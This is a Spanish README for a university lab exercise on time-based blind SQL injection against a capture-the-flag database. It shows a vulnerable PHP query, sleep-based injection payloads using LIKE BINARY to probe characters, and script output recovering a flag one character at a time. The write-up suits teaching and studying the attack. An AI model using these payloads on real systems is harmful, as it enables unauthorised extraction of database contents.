# blind-sql
Script de Python para lanzar una inyección ciega de SQL (Auditoría).

## Introducción
En la práctica primera de la asignatura se nos propone recuperar las flags de una base de datos. Sin embargo, solo tenemos acceso a una pantalla que indica si la query terminó con éxito o no.

Esto es lo que definimos como una blind-SQL, donde sabemos que podemos atacar la base de datos, pero no podemos recuperar datos de forma directa, por lo que solo nos queda tantearlos.

## Vulnerabilidad
Sabemos que la sentenica de SQL vulnerable es algo similar a la siguiente (PHP):
```php
$query = "SELECT flag from x WHERE y = $input";
```
Esto permite que podamos encadenar comandos de SQL después. Si lo encadenamos a una condición que dispare una espera, veremos que las respuestas del servidor tardan más tiempo dependiendo 
del éxito de la consulta. Podemos ver algunos ejemplos en este [repositorio de payloads](https://github.com/payloadbox/sql-injection-payload-list).

La siguiente payload es un ejemplo en el repositorio de [Blisqy](https://github.com/JohnTroony/Blisqy), y vemos que si la consulta resuelve en true, podemos modular el tiempo 
de respuesta de la petición.
```python
sqli = "' or if((*sql*),sleep(*time*),0) and '1'='1"
```
Si encadenamos esto a la sentencia `LIKE` de [SQL](https://stackoverflow.com/questions/14908142/sql-like-search-string-starts-with), podemos determinar con qué caracter empieza una flag.
El siguiente ejemplo recupera de la base de datos todas las entradas que empiecen por v:
```sql
SELECT * from flag WHERE (flag LIKE 'v%');
```

Por último, debemos añadir la palabra clave `BINARY` como [truco](https://www.scaler.com/topics/is-sql-case-sensitive/) para distinguir entre mayúsuclas y minúsculas (case-sensitive), 
ya que el campo por defecto NO lo es (varchar).

```sql
SELECT * from flag WHERE (flag LIKE BINARY 'v%');
```

## Payload
Si juntamos todos los ingredientes que acabamos de mencionar y nos aprovechamos de una flag conocida dentro de la base de datos, podemos terminar de probar la payload.

```sql
1 or if((flag LIKE BINARY 'vamosNano%'),sleep(5),0);
```
En este caso, añado el `1` al inicio para que cuadre con la sentencia original (`where id = 1`).

## Automatización
El siguiente paso es automatizar el proceso para que la búsqueda ciega vaya probando con todos los caracteres ASCII.

El actual estado del script es muy básico, ya que solo comprueba el primer camino que encuentra. Habría que sofisticarlo para que lleve un registro de los flags localizados y 
siga explorando por distintas ramas.

## Resultado
El resultado del script es un éxito, encuentra la flag al completo, y acierta con las mayúsculas en poco tiempo. El mayor de los retrasos es fruto del propio `sleep` de la inyección.
```bash
➜  flag3 py blind-injection.py
[0] The flag is: S
[1] The flag is: SW
[2] The flag is: SW5
[3] The flag is: SW5G
[4] The flag is: SW5GZ
[5] The flag is: SW5GZX
[6] The flag is: SW5GZXJ
[7] The flag is: SW5GZXJu
[8] The flag is: SW5GZXJuY
[9] The flag is: SW5GZXJuYW
[10] The flag is: SW5GZXJuYW5
[11] The flag is: SW5GZXJuYW5k
[12] The flag is: SW5GZXJuYW5kb
[13] The flag is: SW5GZXJuYW5kb1
[14] The flag is: SW5GZXJuYW5kb1d
[15] The flag is: SW5GZXJuYW5kb1dl
[16] The flag is: SW5GZXJuYW5kb1dlV
[17] The flag is: SW5GZXJuYW5kb1dlVH
[18] The flag is: SW5GZXJuYW5kb1dlVHJ
[19] The flag is: SW5GZXJuYW5kb1dlVHJ1
[20] The flag is: SW5GZXJuYW5kb1dlVHJ1c
[21] The flag is: SW5GZXJuYW5kb1dlVHJ1c3
[22] The flag is: SW5GZXJuYW5kb1dlVHJ1c3Q
[23] The flag is: SW5GZXJuYW5kb1dlVHJ1c3Q=
```
